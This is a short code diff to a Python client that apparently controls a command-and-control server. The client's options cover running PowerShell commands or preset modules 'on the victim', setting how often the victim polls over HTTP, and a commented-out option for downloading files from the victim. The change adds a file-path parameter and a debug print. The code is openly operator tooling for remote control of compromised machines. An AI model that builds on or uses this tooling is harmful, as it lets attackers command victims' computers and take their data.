@@ -12,7 +12,8 @@ def argser():
     parser.add_argument("-s","--set", action='store_true', help="set command or delta")
     parser.add_argument("-c","--cmd", help="powershell cmd to run on the victim or name of a preset module")
     parser.add_argument("-d","--delta",help="time separating http requests from the victim")
-    #parser.add_argument("--getpath",help="download a file from the victim")
+    parser.add_argument("-p","--path", help="Path of file")
+    #parser.add_argument("--getpath", help="download a file from the victim")
     return parser.parse_args()
     
 
@@ -24,6 +25,13 @@ if args.id:json["id"]=args.id
 if args.hostname:json["hostname"]=args.hostname
 if args.cmd:json["cmd"]=args.cmd
 if args.delta:json["delta"]=args.delta
+# Additional params
+params={}
+if args.path:
+    params["path"]=args.path
+
+json["params"]=str(params)
+
 URL=args.url 
 if args.list:
     URL += "/list"
@@ -32,6 +40,7 @@ elif args.listcmd:
 elif args.set:
     URL += "/set"
 
+print(json)
 print(r:=requests.get(URL, json=json).text)
 
 if args.listcmd:
